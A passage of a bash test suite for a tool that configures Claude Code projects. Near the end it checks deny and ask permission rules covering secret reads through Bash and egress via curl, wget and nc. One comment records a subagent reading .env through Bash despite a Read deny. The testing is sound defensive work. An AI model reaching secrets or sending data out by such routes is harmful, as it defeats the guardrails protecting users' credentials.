# runner is a legitimate state and doctor has to stay usable in a pipeline.
mp_at days 30
if ( cd "$d" && CLAUDE_CONFIG_DIR="$d/cfg" HOME="$d/empty-home" "$KEEL" doctor >/dev/null 2>&1 ); then
  ok "a stale marketplace clone does not fail doctor"
else bad "marketplace" "doctor failed because the marketplace clone was stale"; fi

# The boundary, both sides. Seven is inclusive and six is not, which is what makes the threshold a
# tested number rather than a comment. An hour is subtracted in mp_at so a whole-day count cannot
# land on the boundary by rounding.
mp_at days 7; out="$(mp_doctor)"
case "$out" in *"was last fetched 7 days ago"*) ok "seven days is inside the stale threshold" ;;
  *) bad "marketplace" "a seven day old clone did not warn; the threshold is meant to be inclusive" ;; esac

mp_at days 6; out="$(mp_doctor)"
case "$out" in
  *"was last fetched"*) bad "marketplace" "a six day old clone warned; the threshold is meant to exclude it" ;;
  *"was fetched 6 day(s) ago"*) ok "six days is inside the fresh threshold and says so" ;;
  *) bad "marketplace" "doctor said nothing at all about a six day old clone" ;;
esac

# The fresh branch must not read as "you are current". This check measures fetch age, and a local
# check cannot tell fetch age from staleness: a three day old clone was several releases behind
# during the burst of nine tags between 2026-08-17 and 2026-08-20.
mp_at days 1; out="$(mp_doctor)"
case "$out" in *"fetch age and not currency"*) ok "the fresh branch says what it is not measuring" ;;
  *) bad "marketplace" "the fresh branch reads as a currency guarantee" ;; esac

# Absence reads as unknown, never as fine. This is the case the whole check turns on: a silent pass
# here is indistinguishable from a check that never ran.
for spec in "absent||no lastUpdated at all" "raw|12345|a numeric lastUpdated" "raw|\"not-a-date\"|an unparseable lastUpdated"; do
    mode="${spec%%|*}"; rest="${spec#*|}"; val="${rest%%|*}"; label="${rest#*|}"
    mp_at "$mode" "$val"; out="$(mp_doctor)"
    case "$out" in
      *"That is unknown, not current"*)
        case "$out" in
          *"was fetched"*) bad "marketplace" "$label reported an age as well as unknown" ;;
          *) ok "$label reads as unknown rather than current" ;;
        esac ;;
      *) bad "marketplace" "$label did not report the age as unknown" ;;
    esac
done

# A clock skewed forward yields a negative age. It must clamp to today rather than printing a
# negative, which would read as fresher than fresh.
mp_at days -5; out="$(mp_doctor)"
case "$out" in
  *"was fetched 0 day(s) ago"*) ok "a future lastUpdated clamps to zero rather than going negative" ;;
  *"-"[0-9]*" day"*) bad "marketplace" "a future lastUpdated printed a negative age" ;;
  *) bad "marketplace" "a future lastUpdated did not clamp to zero" ;;
esac

case "$out" in *" gh "*) bad "marketplace" "doctor still tells people they need gh" ;;
  *) ok "doctor no longer claims gh is required" ;; esac
rm -rf "$d"

# ---- doctor checks the recommended plugin set -----------------------------
# Specified in docs/04 and never written. Found by the plan sweep.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={k:("true" if k in ("test","test_one") else None) for k in d["verify"]}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
seed_standards "$d"
# feature-dev ships a competing pipeline that writes to none of the artifact chain.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".claude/settings.json"; d=json.loads(p.read_text())
d["enabledPlugins"]["feature-dev@claude-plugins-official"]=True
p.write_text(json.dumps(d,indent=2)+"\n")
PY
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *feature-dev*) ok "doctor warns when feature-dev is enabled alongside keel" ;;
  *) bad "doctor plugins" "no warning about feature-dev" ;; esac
# A warning, not a failure: it is a judgement call the user may have made deliberately.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "feature-dev warns without failing"
else bad "doctor plugins" "feature-dev made doctor fail; it is advisory"; fi

# A missing recommended plugin is named, not silently ignored. Isolated from the developer
# machine's own global settings file (`plugin_report` in `lib/harness/claude.sh` reads it
# unconditionally, alongside CLAUDE_CONFIG_DIR, so a user scope that already has
# security-guidance enabled, which this machine's does, masks the project-scope removal below and
# the check never fires): same isolation the marketplace checks above already use.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".claude/settings.json"; d=json.loads(p.read_text())
d["enabledPlugins"]={k:v for k,v in d["enabledPlugins"].items() if "security-guidance" not in k and "feature-dev" not in k}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/empty-home" "$KEEL" doctor 2>&1 )"
case "$out" in *security-guidance*) ok "doctor names a missing recommended plugin" ;;
  *) bad "doctor plugins" "silent about a missing recommended plugin" ;; esac

# ---- the managed block's budget --------------------------------------------
#
# doc 05 said "enforced by keel doctor" for this budget from the beginning, and nothing enforced it.
# The block sits in the prefix of every request in the repository, so the cost of a line added here
# is paid per request per engineer, forever, and nothing about a session makes that visible.

b="$(fixture node-ts)"
( cd "$b" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$b" && "$KEEL" doctor 2>&1 )"
case "$out" in *"keel block is about"*) ok "doctor reports the managed block's token cost" ;;
  *) bad "block budget" "doctor said nothing about the block size" ;; esac

# The shipped block must be inside the ceiling, not merely measured. This is the assertion that
# fails when someone adds a paragraph to the template.
case "$out" in *"over the 700 ceiling"*) bad "block budget" "the shipped block exceeds its own ceiling" ;;
  *) ok "the shipped block is within the 700 token ceiling" ;; esac

# The ceiling is where doctor fails, not what the template aims at. Only the ceiling was asserted
# here, so the template drifted to 518 tokens against its own header's stated 450 and shipped that
# way: every project keel configured then opened with a doctor warning about a block keel wrote,
# which teaches people to read the warning as noise. The target needs its own assertion or it is a
# comment.
case "$out" in *"over the 450 target"*) bad "block budget" "the shipped block exceeds its own 450 token target" ;;
  *) ok "the shipped block is within the 450 token target" ;; esac

# And the check has to bite, or it is a number printed for decoration.
python3 - "$b" <<'PY'
import pathlib, sys
p = pathlib.Path(sys.argv[1]) / "CLAUDE.md"
t = p.read_text()
t = t.replace("<!-- keel:end -->", ("Filler that costs tokens and says nothing at all. " * 90) + "\n<!-- keel:end -->")
p.write_text(t)
PY
if ( cd "$b" && "$KEEL" doctor >/dev/null 2>&1 ); then
    bad "block budget" "an oversized block did not fail doctor"
else
    out="$( cd "$b" && "$KEEL" doctor 2>&1 )"
    case "$out" in *"over the 700 ceiling"*) ok "doctor fails on a block over the ceiling" ;;
      *) bad "block budget" "doctor failed but not because of the block size" ;; esac
fi
rm -rf "$b"

# ---- boundaries against a plugin nobody anticipated ------------------------
#
# The registry of known competing plugins can only name the ones we have met. This is the check that
# does not need to: a plugin shipping a skill name keel also ships is found by reading the
# installed cache, whoever wrote it. The collision is silent in a real session, which is why it is
# worth a warning at all: the model resolves the name to one of the two and records nothing.
rival_cfg="$(mktemp -d)"
mkdir -p "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/tdd"
printf -- '---\nname: tdd\ndescription: Use when writing tests.\n---\n\n# TDD\n' \
  > "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/tdd/SKILL.md"
printf '{"enabledPlugins":{"rival@somemarket":true}}\n' > "$rival_cfg/settings.json"

out="$( cd "$d" && CLAUDE_CONFIG_DIR="$rival_cfg" "$KEEL" doctor 2>&1 )"
case "$out" in *"skill named 'tdd'"*) ok "doctor finds a duplicate skill name from an unknown plugin" ;;
  *) bad "boundaries" "no warning about two plugins shipping 'tdd'" ;; esac
case "$out" in *rival*) ok "the duplicate warning names the other plugin" ;;
  *) bad "boundaries" "the duplicate warning did not say which plugin" ;; esac

# Advisory, like every other boundary finding. Disabling a plugin is the user's call.
if ( cd "$d" && CLAUDE_CONFIG_DIR="$rival_cfg" "$KEEL" doctor >/dev/null 2>&1 ); then
    ok "a duplicate skill name warns without failing"
else bad "boundaries" "a duplicate skill name made doctor fail; it is advisory"; fi

# A plugin whose skills do not overlap must produce nothing. A boundary check that fires on every
# installed plugin is noise, and noise is how a real collision gets scrolled past.
mv "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/tdd" \
   "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/unrelated-thing"
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$rival_cfg" "$KEEL" doctor 2>&1 )"
case "$out" in *"skill named"*) bad "boundaries" "warned about a plugin with no overlapping skill" ;;
  *) ok "a plugin with no overlapping skill produces no boundary warning" ;; esac
rm -rf "$rival_cfg"
rm -rf "$d"

# ---- profile get speaks JSON, not Python ----------------------------------
# Found by running `keel profile set stack.has_ui true` from design-architecture and reading it
# back: the profile holds JSON true and `profile get` returned Python's True, so the value cannot
# round-trip and no shell comparison against `true` works. bin/keel had already grown a workaround
# for this at one call site, accepting both "False" and "false", and not at the other.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile set stack.has_ui true >/dev/null 2>&1 )
[ "$( cd "$d" && "$KEEL" profile get stack.has_ui )" = "true" ] \
  && ok "profile get returns a JSON true, not Python's True" \
  || bad "profile get" "returned '$( cd "$d" && "$KEEL" profile get stack.has_ui )', want 'true'"

( cd "$d" && "$KEEL" profile set stack.has_ui false >/dev/null 2>&1 )
[ "$( cd "$d" && "$KEEL" profile get stack.has_ui )" = "false" ] \
  && ok "and a JSON false" \
  || bad "profile get" "returned '$( cd "$d" && "$KEEL" profile get stack.has_ui )', want 'false'"

# What set writes is what get reads. Without this the two halves of one command disagree.
( cd "$d" && "$KEEL" profile set stack.has_ui "$( cd "$d" && "$KEEL" profile get stack.has_ui )" >/dev/null 2>&1 )
python3 -c "
import json,sys
v=json.load(open('$d/.keel/profile.json'))['stack']['has_ui']
sys.exit(0 if v is False else 1)" \
  && ok "a value read back and set again survives as a boolean" \
  || bad "profile get" "round-tripping through get turned the boolean into something else"
rm -rf "$d"

# The internal reader that compared against Python's spelling must still fire. It is the only thing
# that tells a project its has_ui is wrong, and a silent regression here is invisible.
d="$(fixture node-ts)"
mkdir -p "$d/public"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile set stack.has_ui false >/dev/null 2>&1 )
out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *"stack.has_ui is false, but this project looks like it has a user interface"*)
    ok "doctor still catches a wrong has_ui after the boolean change" ;;
  *) bad "profile get" "the has_ui mismatch warning stopped firing" ;; esac
rm -rf "$d"

# ---- doctor's summary counts its warnings ---------------------------------
# Three warnings scrolled past, then "keel doctor: no problems". Writing the PR body for 0.6.1
# meant counting them by hand to say "no problems and one warning", which is the tell.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && "$KEEL" init -y >/dev/null 2>&1 )
seed_standards "$d"
out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
warns="$(printf '%s\n' "$out" | grep -c '^WARN')"
[ "$warns" -gt 0 ] || bad "doctor summary" "fixture produced no warnings, so this proves nothing"
case "$out" in *"keel doctor: no problems, $warns warning"*)
    ok "doctor's summary names the warning count" ;;
  *) bad "doctor summary" "summary ignored $warns warnings: $(printf '%s\n' "$out" | tail -1)" ;; esac
rm -rf "$d"

# ---- what init tells a project to do next ---------------------------------
# Found by running init on an empty directory for a real greenfield project, 2026-08-15. It closed
# by suggesting `use repo-snapshot on this codebase` when there was no codebase, and separately
# demanded verify.test be set by hand on a project that doctor itself excuses. Both messages are the
# first thing a new project reads, and both were wrong for the case the plan calls the more
# important pilot.

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"

case "$out" in *repo-snapshot*) bad "next step" "a project with no code was told to snapshot a codebase" ;;
  *) ok "init does not suggest repo-snapshot where there is no code" ;; esac
case "$out" in *shape-idea*|*write-prd*) ok "init points a pre-implementation project at the artifact chain" ;;
  *) bad "next step" "no useful next step for a greenfield project: $out" ;; esac

# doctor treats kind 'docs' as pre-implementation and says verify commands are not expected. init
# telling the same project to set them by hand is the same state answered two contradictory ways,
# and init's answer is the one read first.
case "$out" in *"no test command was detected"*) bad "next step" "init demanded a test command on a pre-implementation project" ;;
  *) ok "init does not demand verify.test before there is code" ;; esac
rm -rf "$d"

# A project that does have code still gets both, because both are right there.
d="$(fixture node-ts)"
( cd "$d" && rm -f package.json && printf 'const x = 1;\n' > app.ts && git add -A && git commit -qm code )
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
case "$out" in *repo-snapshot*) ok "a project with code is still pointed at repo-snapshot" ;;
  *) bad "next step" "repo-snapshot was dropped for a project that has code" ;; esac
case "$out" in *"no test command was detected"*) ok "a code project with no test command is still told" ;;
  *) bad "next step" "the missing test command went unreported on a code project" ;; esac
rm -rf "$d"

# ---- the marketplace declaration keel init must not make ------------------
# A marketplace source says where this reader gets keel from, which is a fact about a machine and
# not about a project. Committed to a repository it asserts one answer for everyone who clones it,
# and it was wrong two ways at once: a reader outside the GitHub org cannot reach a private repo,
# and at project scope it shadowed the user's own declaration. Measured on the author's machine:
# user settings declared `gbi` as a directory source at the working repo, and known_marketplaces.json
# had resolved `gbi` to the github source with a clone of the merged main, so every keel project was
# loading published skills rather than the ones being edited.
#
# The working case is in the same function: every @claude-plugins-official plugin is enabled with no
# marketplace declaration at all and resolves fine, because that marketplace is known at user level.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$d/.claude/settings.json'))
sys.exit(0 if 'extraKnownMarketplaces' not in s else 1)" \
  && ok "init declares no marketplace source in the committed settings" \
  || bad "marketplace" "init wrote extraKnownMarketplaces, which is a per-machine fact"

# Three keys out of the one profile in one read. Terse is the default a project gets without
# asking, and the key is written explicitly rather than left absent and defaulted, so a reader can
# see it and change it without first knowing it exists. explain_level is written for the same
# reason: technical is what a project gets without asking.
#
# The watchdog cannot read the window from a session, so gates.context_window is the only correct
# mechanism and nothing wrote it. 200000 is conservative and sometimes wrong, which is acceptable
# only because a configured window is a floor: a larger session raises it in flight rather than
# being stopped at 85% of the wrong number.
{ read -r response_style; read -r explain_level; read -r context_window; } <<EOF
$(prof_of "$d" conventions.response_style conventions.explain_level gates.context_window)
EOF
[ "$response_style" = terse ] \
  && ok "init writes conventions.response_style=terse" \
  || bad "response_style" "init did not write terse"

[ "$explain_level" = technical ] \
  && ok "init writes conventions.explain_level=technical" \
  || bad "explain_level" "init did not write technical"

[ "$context_window" = 200000 ] \
  && ok "init writes gates.context_window=200000" \
  || bad "context_window" "init did not write gates.context_window"

# gates.context_window was already declared by the schema, which is why writing it into init's
# output needed no SCHEMA_VERSION bump. This pins that fact rather than the version number it
# happened to sit at: the literal 1 was unsatisfiable by any legitimate bump, and it blocked the
# first one that came along (conventions.explain_level, 2026-08-18, which does add a key path and
# therefore does require the bump the fingerprint rule demands).
python3 -c "
import json,sys
g=json.load(open('$ROOT/templates/profile.schema.json'))['properties']['gates']['properties']
sys.exit(0 if 'context_window' in g else 1)" \
  && ok "context_window is schema-declared, so writing it needed no bump" \
  || bad "context_window" "gates.context_window is no longer declared by the schema"

# Re-running init is how a project picks up new keel defaults, and it must not quietly downgrade a
# 1M project to a 200000 window on the way. merge_profile gives a non-empty human value precedence;
# nothing asserted it for this key.
e="$(fixture node-ts)"
( cd "$e" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$e" <<'PY2'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=1000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY2
( cd "$e" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
sys.exit(0 if json.load(open('$e/.keel/profile.json'))['gates']['context_window']==1000000 else 1)" \
  && ok "re-running init preserves a hand-set context_window" \
  || bad "context_window" "re-init overwrote a human value, downgrading a 1m project"

( cd "$e" && "$KEEL" init --force -y >/dev/null 2>&1 )
python3 -c "
import json,sys
sys.exit(0 if json.load(open('$e/.keel/profile.json'))['gates']['context_window']==200000 else 1)" \
  && ok "init --force replaces context_window, as it replaces the rest of the profile" \
  || bad "context_window" "--force left the old value"

# And the downgrade --force just performed is recoverable in flight, which is the only reason it is
# acceptable behaviour rather than a defect.
got="$(env -u KEEL_CONTEXT_WINDOW python3 -c "
import sys
sys.path.insert(0, '$ROOT/lib')
import context_watch
print(context_watch.window_for('claude-opus-5', observed=400000, configured=200000))
")"
[ "$got" = "1000000" ] && ok "a force-downgraded window is raised again by observation" \
  || bad "context_window" "got $got: --force would strand a 1m project at 200000"
rm -rf "$e"

# Four places describe how the window is decided and all four said an explicit setting simply wins.
# That stopped being true when the profile key became a floor. A description that is wrong is worse
# than none: it is read once and believed.
f="$(fixture node-ts)"
( cd "$f" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$f" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"context watchdog available (window 200000"*) ok "doctor names the configured window" ;;
  *) bad "doctor window" "did not name the configured window" ;;
esac
case "$out" in
  *raised*) ok "doctor says the configured window can be raised by observation" ;;
  *) bad "doctor window" "doctor still presents the configured window as final" ;;
esac

python3 - "$f" <<'PY2'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["context_window"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY2
out="$( cd "$f" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"window assumed 200000"*) ok "doctor still explains an unset window for older profiles" ;;
  *) bad "doctor window" "the unset branch stopped being reachable or accurate" ;;
esac
rm -rf "$f"

grep -q 'floor' templates/profile.schema.json \
  && ok "the gates.context_window description describes the floor" \
  || bad "schema doc" "the schema still describes a configured window as simply winning"

# The bound must not be silent. It exists because a mistyped window disables the watchdog without
# saying so, and a bound that clamps without saying so has moved that failure rather than fixed it.
g="$(fixture node-ts)"
( cd "$g" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$g" <<'PY3'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=200000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY3
out="$( cd "$g" && "$KEEL" doctor 2>&1 )"
case "$out" in *200000000*) ok "doctor names the configured value it bounded" ;;
  *) bad "bound report" "doctor did not name the configured 200000000" ;; esac
case "$out" in *1000000*) ok "doctor names the value actually in use" ;;
  *) bad "bound report" "doctor did not name the bounded 1000000" ;; esac

python3 - "$g" <<'PY3'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=1000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY3
out="$( cd "$g" && "$KEEL" doctor 2>&1 )"
case "$out" in *"above the largest"*) bad "bound report" "doctor warned about a legitimate 1000000" ;;
  *) ok "doctor says nothing about bounding a window at the maximum" ;; esac
rm -rf "$g"

# Doctor must report the window the watchdog will actually use, not the number in the file. The
# profile key is a floor: it raises the starting window and never lowers it, so a value at or below
# the default is discarded. Reporting it as though it were in force tells someone who lowered the
# window to get an earlier pause that it worked, when nothing changed.
h="$(fixture node-ts)"
( cd "$h" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$h" <<'PY4'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=50000
p.write_text(json.dumps(d,indent=2)+"\n")
PY4
out="$( cd "$h" && "$KEEL" doctor 2>&1 )"
case "$out" in *"window 50000 from gates"*) bad "doctor window" "doctor reports 50000 as in force; the watchdog uses 200000" ;;
  *) ok "doctor does not report a below-default window as the one in use" ;; esac
case "$out" in *200000*) ok "doctor names the window actually in force for a below-default setting" ;;
  *) bad "doctor window" "doctor did not name 200000, the window really in use" ;; esac

# And the environment override is what doctor must report when it is set, since it beats the file.
out="$( cd "$h" && KEEL_CONTEXT_WINDOW=500000 "$KEEL" doctor 2>&1 )"
case "$out" in *KEEL_CONTEXT_WINDOW*500000*|*500000*KEEL_CONTEXT_WINDOW*) ok "doctor reports the environment override when it is set" ;;
  *) bad "doctor window" "doctor ignored KEEL_CONTEXT_WINDOW while claiming it overrides" ;; esac
rm -rf "$h"

# The enabledPlugins entry stays. That is the part that is true of the project: this is the plugin
# set the repository expects, and a teammate running /plugin sees it already listed.
case "$(plugins_of "$d")" in *"keel@gbi"*) ok "init still records that the project expects keel@gbi" ;;
  *) bad "marketplace" "keel@gbi is no longer enabled: $(plugins_of "$d")" ;; esac

# Nothing in the committed file may name the private repository. The nudge names it, and should:
# an install instruction is advice a reader acts on, not a declaration a machine resolves.
grep -q 'gbi-solutions-ltd/keel' "$d/.claude/settings.json" \
  && bad "marketplace" "the committed settings.json names the private repo" \
  || ok "the committed settings.json names no private repository"
rm -rf "$d"

# ---- the plugin-less nudge hook -------------------------------------------
# Load-bearing per decision 1: with skills living in the plugin rather than the repo, this hook is
# the only thing that tells a session without the plugin that a standard exists at all.
#
# The hook cannot detect the plugin, and no rewrite of it can. CLAUDE_PLUGIN_ROOT is set only for
# hooks a plugin itself defines, pointing at that plugin's own directory; a hook registered in a
# project's settings.json never receives it. Measured in a live session: a project SessionStart hook
# sees CLAUDE_PROJECT_DIR and thirteen other CLAUDE_* variables, and not one of them names a loaded
# plugin. So the message is a conditional the reader evaluates against its own skill list, and these
# cases pin that it does not depend on the environment.

parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-nudge --stack node >/dev/null 2>&1 )
d="$parent/svc-nudge"
[ -f "$d/.claude/keel-nudge" ] && ok "new writes the plugin-less nudge hook" || bad "nudge" "hook absent"

# Same output either way. Keying off CLAUDE_PLUGIN_ROOT made the hook silent under a test that set
# the variable by hand and loud in every real session, including ones with all 24 skills loaded.
with="$( cd "$d" && CLAUDE_PLUGIN_ROOT=/somewhere/keel .claude/keel-nudge 2>&1 )"
without="$( cd "$d" && env -u CLAUDE_PLUGIN_ROOT .claude/keel-nudge 2>&1 )"
{ [ -n "$without" ] && [ "$with" = "$without" ]; } && ok "the nudge does not key off CLAUDE_PLUGIN_ROOT" \
  || bad "nudge" "output depends on CLAUDE_PLUGIN_ROOT, which a project hook never receives"

# The condition has to be one the reader can check, which is its own skill list.
case "$without" in *'keel:'*) ok "nudge states a condition the reader can evaluate" ;;
  *) bad "nudge" "does not say how to tell whether the plugin is loaded: $without" ;; esac

case "$without" in *"marketplace add"*) ok "nudge names the install command" ;;
  *) bad "nudge" "said nothing useful: $without" ;; esac

# It must emit valid hook JSON, or the session start breaks rather than being nudged.
printf '%s' "$without" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null \
  && ok "nudge emits valid hook JSON" || bad "nudge" "output is not valid JSON"

# It prints in every session, so it sits in the prefix of every request of that session. Budgeted
# like the SessionStart injection beside it, estimated at chars/3.6 the same way.
n=$(printf '%s' "$without" | wc -c | tr -d ' ')
[ "$(( n * 10 / 36 ))" -le 200 ] && ok "nudge is within its 200-token budget" \
  || bad "nudge" "is about $(( n * 10 / 36 )) tokens, over the 200 ceiling"

# Registered in settings so a session actually runs it.
grep -q 'keel-nudge' "$d/.claude/settings.json" && ok "nudge is registered in settings.json" \
  || bad "nudge" "not registered as a SessionStart hook"
rm -rf "$parent"

# ---- staleness against the installed version -------------------------------
# Per-project files do not update themselves when the plugin does, so the profile has to record
# which keel wrote it. That only works if init overwrites the field, which the merge would
# otherwise refuse to do: every other value in the profile is one a human may have corrected.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

# schema_version is the tool's, like keel_version. It answers "does this profile have the fields
# the installed keel expects", which keel_version cannot, because most releases change no field.
got="$(python3 -c "import json;print(json.load(open('$d/.keel/profile.json')).get('schema_version'))")"
want="$(sed -n 's/^SCHEMA_VERSION=\([0-9][0-9]*\)$/\1/p' "$ROOT/bin/keel")"
[ -n "$want" ] && [ "$got" = "$want" ] && ok "init writes the schema_version bin/keel declares" \
  || bad "schema_version" "profile has '$got', bin/keel declares '$want'"

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["schema_version"] = 0
p.write_text(json.dumps(d, indent=2) + "\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" schema_version)"
[ "$got" = "$want" ] && ok "re-running init reclaims schema_version" \
  || bad "schema_version" "stayed '$got' after re-init, want '$want'"

out="$( cd "$d" && "$KEEL" profile set schema_version 2 2>&1 )" && rc=0 || rc=$?
case "$rc:$out" in
  1:*"written by init"*) ok "profile set refuses schema_version" ;;
  *) bad "schema_version" "profile set did not refuse: rc=$rc out=${out:0:80}" ;;
esac

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["keel_version"] = "0.0.1-old"
p.write_text(json.dumps(d, indent=2) + "\n")
PY
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"configured by keel 0.0.1-old"*) ok "doctor reports which keel configured the project" ;;
  *) bad "staleness" "doctor did not report the configuring version" ;; esac

# The point of the split: an old keel_version alone is not staleness any more, because most
# releases change no field. Only a schema_version mismatch is.
# Matched on the staleness message's own tail, not on "Re-run 'keel init'", which doctor also emits
# for missing permission guardrails. The looser pattern passed only because init had just written
# those guardrails into this fixture, so a regression there would have failed this test and sent the
# reader to the wrong code.
case "$out" in *"to pick up the new fields"*) bad "staleness" "warned on keel_version alone, which fires on every release" ;;
  *) ok "an old keel_version alone does not raise the re-run warning" ;; esac

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); del d["schema_version"]
p.write_text(json.dumps(d, indent=2) + "\n")
PY
out2="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out2" in *"schema version none"*) ok "doctor treats an absent schema_version as stale" ;;
  *) bad "staleness" "doctor did not notice a profile with no schema_version" ;; esac

( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" keel_version)"
want="$(cat "$ROOT/VERSION")"
[ "$got" = "$want" ] && ok "re-running init refreshes the recorded version" \
  || bad "staleness" "version stayed '$got', want '$want'"

# The tool owns that one field. Everything else in the profile still belongs to the human, and
# the same re-init must not have touched it.
python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["verify"]["test"] = "npm test -- --runInBand"
p.write_text(json.dumps(d, indent=2) + "\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
case "$got" in *runInBand*) ok "refreshing the version does not disturb human values" ;;
  *) bad "staleness" "verify.test was overwritten with '$got'" ;; esac
rm -rf "$d"

# ---- permission guardrails and the permission mode -------------------------
# The design: bypassPermissions per developer in the local file, guardrails for everyone in the
# committed one. It rests on deny and ask rules still applying once prompts are off, which was
# verified against a live session. These tests pin the file shapes that carry it.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']
sys.exit(0 if p.get('deny') and p.get('ask') else 1)" 2>/dev/null \
  && ok "init writes deny and ask rules into the committed settings" \
  || bad "guardrails" "no deny/ask rules in .claude/settings.json"

# A Read deny matches the Read tool and nothing else, so `cat .env` reaches the same bytes through a
# different door. Found when a subagent running under these exact rules reported .env contents it had
# read via Bash. The Bash entries are defence in depth, not a boundary, and the comment on
# keel_deny_rules says so; this asserts they are at least present.
python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']['deny']
sys.exit(0 if any(r.startswith('Bash(') and 'env' in r for r in p) else 1)" 2>/dev/null \
  && ok "the deny list covers reading a secret through Bash, not only through Read" \
  || bad "guardrails" "only Read is denied, so cat .env is unguarded"

# Egress. The deny list stops the file tools reading a secret; nothing stopped a session posting
# whatever it could already read, which decision 12 recorded as the open gap when it accepted the
# bypassPermissions default. Asserted per command rather than as a count, because a count passes
# while naming the wrong three.
for cmd in curl wget nc; do  # supply-chain-scan: allow the commands this assertion looks for in the rule list
  python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']['ask']
sys.exit(0 if any(r.startswith('Bash($cmd ') for r in p) else 1)" 2>/dev/null \
    && ok "the ask list restores a prompt for $cmd" \
    || bad "guardrails" "$cmd is not in the ask list, so egress is unprompted under bypassPermissions"
done

# The security property of the whole split. A committed bypassPermissions turns off prompts for
# everyone who clones the repository, before they have read a line of it.
grep -q 'bypassPermissions' "$d/.claude/settings.json" \
  && bad "guardrails" "bypassPermissions leaked into the committed settings.json" \
  || ok "the committed settings.json sets no permission mode"

grep -q 'bypassPermissions' "$d/.claude/settings.local.json" 2>/dev/null \
  && ok "init sets bypassPermissions in the local settings" \
  || bad "guardrails" "no defaultMode in .claude/settings.local.json"

( cd "$d" && git check-ignore -q .claude/settings.local.json ) \
  && ok "init git-ignores the local settings file" \
  || bad "guardrails" ".claude/settings.local.json is not ignored"

# A mature repo already has both files, and is exactly the case that most needs the guardrails.
# Nothing already in them may be lost.
d2="$(fixture node-ts)"
mkdir -p "$d2/.claude"
printf '{ "enabledPlugins": { "someone-elses@thing": true } }\n' > "$d2/.claude/settings.json"
printf '{ "permissions": { "allow": ["Bash(npm test:*)"] } }\n' > "$d2/.claude/settings.local.json"
( cd "$d2" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$d2/.claude/settings.json'))
